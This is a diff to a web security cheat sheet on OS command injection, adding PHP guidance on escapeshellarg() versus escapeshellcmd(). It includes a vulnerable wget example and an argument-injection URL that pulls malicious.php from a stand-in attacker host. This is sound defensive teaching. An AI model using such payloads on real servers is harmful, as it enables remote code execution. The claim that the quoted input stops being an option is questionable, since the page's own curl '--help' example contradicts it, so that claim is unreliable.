@@ -3043,7 +3043,7 @@
 </code></pre></div>
 <p>which will prevent an attacker to run other commands.</p>
 <p>However, if the attacker controlled string contains an additional argument of the <code>curl</code> command:</p>
-<div class="highlight"><pre><span></span><code>system(&quot;curl &quot; . escape(&quot;--help&quot;))
+<div class="highlight"><pre><span></span><code><span class="x">system(&quot;curl &quot; . escape(&quot;--help&quot;))</span>
 </code></pre></div>
 <p>Now when the above code is executed, it will show the output of <code>curl --help</code>.</p>
 <p>Depending upon the system command used, the impact of an Argument injection attack can range from <strong>Information Disclosure</strong> to critical <strong>Remote Code Execution</strong>.</p>
@@ -3170,7 +3170,34 @@ ERROR :
 <h3 id="net">.Net<a class="headerlink" href="#net" title="Permanent link">&para;</a></h3>
 <p>See relevant details in the <a href="DotNet_Security_Cheat_Sheet.html#os-injection">DotNet Security Cheat Sheet</a></p>
 <h3 id="php">PHP<a class="headerlink" href="#php" title="Permanent link">&para;</a></h3>
-<p>In PHP use <a href="https://www.php.net/manual/en/function.escapeshellarg.php">escapeshellarg()</a> or <a href="https://www.php.net/manual/en/function.escapeshellcmd.php">escapeshellcmd()</a> rather than <a href="https://www.php.net/manual/en/function.exec.php">exec()</a>, <a href="https://www.php.net/manual/en/function.system.php">system()</a>, <a href="https://www.php.net/manual/en/function.passthru.php">passthru()</a>.</p>
+<p>PHP exposes two helper functions when you must pass user input to a shell: <code>escapeshellarg()</code> and <code>escapeshellcmd()</code>.</p>
+<p><code>escapeshellarg()</code>:  Ensures the user can pass only one parameter to the command, cannot add extra parameters, and cannot execute a different command.</p>
+<p><code>escapeshellcmd()</code>: Ensures the user can execute only the intended command, can pass unlimited parameters, but cannot execute other commands.</p>
+<p>It is always preferable to use <code>escapeshellarg()</code> rather than <code>escapeshellcmd()</code> when dealing with user input.</p>
+<p>For example, consider this code using <code>wget</code> with <code>escapeshellcmd()</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="x">$url = $_GET[&#39;url&#39;];</span>
+<span class="x">$command = &#39;wget --directory-prefix=..\temp &#39; . $url;</span>
+<span class="x">system(escapeshellcmd($command));</span>
+</code></pre></div>
+<p>If the user provides:</p>
+<div class="highlight"><pre><span></span><code>http://victim.com/download.php?url=--directory-prefix=. http://attacker.com/malicious.php
+</code></pre></div>
+<p><code>escapeshellcmd()</code> will still allow this extra parameter meaning the attacker can override the original <code>--directory-prefix</code> option, save the file in the current directory and then achieve remote command execution on the server.</p>
+<p>The safe approach is to use <code>escapeshellarg()</code> so that the URL is treated as a single argument:</p>
+<div class="highlight"><pre><span></span><code><span class="x">$url = $_GET[&#39;url&#39;];</span>
+<span class="x">$command = &#39;wget --directory-prefix=..\temp &#39; . escapeshellarg($url);</span>
+<span class="x">system($command);</span>
+</code></pre></div>
+<p>Now the malicious input becomes:</p>
+<div class="highlight"><pre><span></span><code>wget --directory-prefix=..\temp &#39;--directory-prefix=. http://attacker.com/malicious.php&#39;
+</code></pre></div>
+<p>Here, the second <code>--directory-prefix</code> is part of the quoted string, not a real option, so the attack fails.</p>
+<p>In addition, it is good security practice to follow these recommendations:  </p>
+<ul>
+<li><strong>Hardcode the command</strong>: never allow the user to choose which executable to run.  </li>
+<li><strong>Hardcode options</strong>: required flags (e.g., <code>--directory-prefix</code>) should be in the code, not in user input.  </li>
+<li><strong>Validate and restrict input as much as possible</strong>: apply strict validation rules, whitelists, and format checks to minimize the attack surface.</li>
+</ul>
 <h2 id="related-articles">Related articles<a class="headerlink" href="#related-articles" title="Permanent link">&para;</a></h2>
 <h3 id="description-of-command-injection-vulnerability">Description of Command Injection Vulnerability<a class="headerlink" href="#description-of-command-injection-vulnerability" title="Permanent link">&para;</a></h3>
 <ul>
